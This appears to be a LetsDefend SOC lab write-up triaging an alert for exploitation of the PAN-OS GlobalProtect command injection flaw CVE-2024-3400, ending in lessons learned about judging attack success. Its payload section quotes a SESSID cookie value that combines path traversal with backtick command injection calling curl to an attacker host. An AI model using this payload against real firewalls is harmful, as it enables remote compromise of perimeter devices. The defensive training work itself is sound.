---
title: "⭐ SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)"
date: 2026-04-18 13:20:00 +0530
categories: [LetsDefend,SOC]
tags: [LetsDefend,SOC,Security_Analyst,Triage,EventID_249,Palo_Alto,Command_Injection,Zero_Day]
image:
  path: /assets/img/headers/Lets_defend_Banner.avif
  alt: Lets-Defend
---

**Incident ID:** SOC274

**Event ID:** 249

**Date:** April 18, 2024

**Severity:** Critical (CVSS 10.0)

**Focus:** OS Command Injection / Zero-Day Exploitation

---

## **1. Initial Triage & External Investigation**

| **Playbook Question** | **Answer** | **Evidence / Reasoning** |
| --- | --- | --- |
| **Is the traffic coming from outside?** | **YES** | Source IP `144.172.79.92` is public. |
| **Ownership of IP address?** | **VPS Hosting** | Registered to Cloudzy / RouterHosting LLC. |
| **Reputation of IP?** | **Malicious** | 12/94 detections on VirusTotal. |
| **Direction of Traffic?** | **Internet → Company** | Inbound traffic targeting perimeter device. |
| **Attack Simulation?** | **NO** | External malicious VPS, not internal testing. |

![Screenshot 2026-04-20 at 8.20.25 PM.png](/assets/img/Lets-Defend-SOC274-Photos/Screenshot_2026-04-20_at_8.20.25_PM.png)

![Screenshot 2026-04-20 at 8.27.28 PM.png](/assets/img/Lets-Defend-SOC274-Photos/Screenshot_2026-04-20_at_8.27.28_PM.png)

---

## **2. Internal Investigation (Target Identification)**

| **Playbook Question** | **Answer** |
| --- | --- |
| **Target Hostname** | Internal-Firewall-GP |
| **Target IP Address** | `172.16.17.139` |
| **Exposed Service** | Palo Alto GlobalProtect Portal |

The targeted asset is a **critical perimeter firewall**, increasing the severity due to potential **network-wide compromise**.

---

## **3. Traffic & Payload Analysis**

| **Playbook Question** | **Answer** | **Evidence / Reasoning** |
| --- | --- | --- |
| **Attack Type** | **OS Command Injection** | Backticks (```) used to execute shell commands. |
| **Attack Vector** | **HTTP Cookie (SESSID)** | Payload embedded in session cookie. |

### **Key Observation**

- Malicious payload delivered via:
    
    ```
    SESSID=./../../../.../aaa`curl attacker-domain`
    ```
    
    ![Screenshot 2026-04-21 at 7.54.12 PM.png](/assets/img/Lets-Defend-SOC274-Photos/Screenshot_2026-04-21_at_7.54.12_PM.png)
    
- Combines **path traversal + command injection**

---

## **4. Determining Attack Success (Critical Analytical Pivot)**

### **Initial (Incorrect) Assessment**

- **Conclusion:** Attack failed
- **Reasoning:** Observed `DNS lookup failed` for attacker’s `curl` command

---

### **Corrected (Final) Assessment**

- **Conclusion:** **Attack SUCCESSFUL**

### **Why the Attack Was Successful**

### **1. Web Layer Confirmation**

- Nginx logs show **HTTP 200 OK**
- Indicates the payload was **accepted and processed**

![Screenshot 2026-04-21 at 7.56.35 PM.png](/assets/img/Lets-Defend-SOC274-Photos/Screenshot_2026-04-21_at_7.56.35_PM.png)

---

### **2. Application Logic Compromise**

- CVE-2024-3400 is triggered when:
    - Input is **not sanitized**
    - System attempts to **execute injected command**
- Exploit success = **execution attempt**, not attacker callback success

---

### **3. OS-Level Execution Evidence**

- Logs show **`dt_send` service** invoking malicious input
- Followed by **Python process execution**
- Strong indicator of **stage-two payload deployment** (e.g., UPSTYLE backdoor)

![Screenshot 2026-04-21 at 7.59.13 PM.png](/assets/img/Lets-Defend-SOC274-Photos/Screenshot_2026-04-21_at_7.59.13_PM.png)

---

### **Key Insight**

Even though the attacker’s outbound `curl` failed:

- The system **already executed attacker-controlled input**
- This confirms a **full security boundary breach**

---

## **5. Escalation Decision**

| **Playbook Question** | **Answer** | **Reasoning** |
| --- | --- | --- |
| **Tier 2 Escalation Required?** | **YES** | Root-level command execution on a perimeter device |

### **Justification**

- Zero-day exploitation
- Remote code execution
- Critical infrastructure exposure
- Evidence of post-exploitation activity

---

## **6. Artifacts Collected**

- **Source IP:** `144.172.79.92`
- **Victim IP:** `172.16.17.139`
- **Target URL:** `/global-protect/login.esp`
- **Attack Vector:** HTTP Cookie (`SESSID`)
- **Payload Pattern:** Command injection using backticks

---

## **7. Lessons Learned & Analyst Reflection**

### **Key Takeaways**

- **Exploit Success ≠ Payload Completion**
    - A failed callback (DNS/curl) does not mean the attack failed
- **The “200 OK Rule”**
    - A `200` response on a known exploit endpoint is a major red flag
- **Focus on Root Cause, Not Symptoms**
    - The real issue is **unsanitized input execution**, not network failure
- **Look for Secondary Indicators**
    - Process creation (Python, shell activity) is critical evidence

---

### **Professional Reflection**

This case highlighted the importance of distinguishing between **exploit execution** and **attacker objective completion**.

Initially, I incorrectly classified the attack as unsuccessful due to a failed DNS resolution in the attacker’s `curl` command. However, deeper analysis revealed:

- The server returned **HTTP 200 OK**
- The system attempted to **execute injected commands**
- A **Python process was spawned**, indicating post-exploitation activity

This reinforced a critical SOC principle:

> **If the vulnerability is triggered and code execution occurs, the system is compromised—regardless of whether the attacker achieves full command-and-control.**
